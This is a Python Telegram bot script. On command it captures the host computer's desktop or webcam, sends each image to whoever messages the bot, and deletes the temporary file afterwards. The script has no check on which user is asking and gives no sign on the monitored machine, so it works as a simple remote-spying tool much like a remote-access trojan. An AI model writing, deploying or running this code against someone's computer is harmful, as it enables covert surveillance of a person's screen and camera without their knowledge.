import pyautogui, os, cv2
from telebot import TeleBot, types
from dotenv import load_dotenv


load_dotenv()
bot = TeleBot(os.getenv("TOKEN"))


# Start command handler
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    desktop_screenshot_btn = types.KeyboardButton("Desktop screenshot")
    webcam_screenshot_btn = types.KeyboardButton("Webcam screenshot")
    markup.add(desktop_screenshot_btn, webcam_screenshot_btn)
    bot.send_message(message.from_user.id, "Choose option", reply_markup=markup)


# Handle keyboard buttons
@bot.message_handler(content_types=['text'])
def get_text_messages(message):
    if message.text == 'Desktop screenshot':
        pyautogui.screenshot().save(r'C:\Windows\Temp\test.png')
        screen = open('C:/Windows/Temp/test.png', 'rb')
        bot.send_photo(message.from_user.id, screen)
        screen.close()
        os.remove('C:/Windows/Temp/test.png')


    if message.text == 'Webcam screenshot':
        cap = cv2.VideoCapture(0)

        for i in range(30):
            cap.read()

        ret, frame = cap.read()
        if frame is not None:
            cv2.imwrite('C:/Windows/Temp/cam.png', frame)
            cap.release()
            cam_img = open('C:/Windows/Temp/cam.png', 'rb')
            bot.send_photo(message.from_user.id, cam_img)
            cam_img.close()
            os.remove("C:/Windows/Temp/cam.png")
        else:
            bot.send_message(message.from_user.id, "Not found webcamera")


if __name__ == "__main__":
    bot.polling(none_stop=True, interval=0)
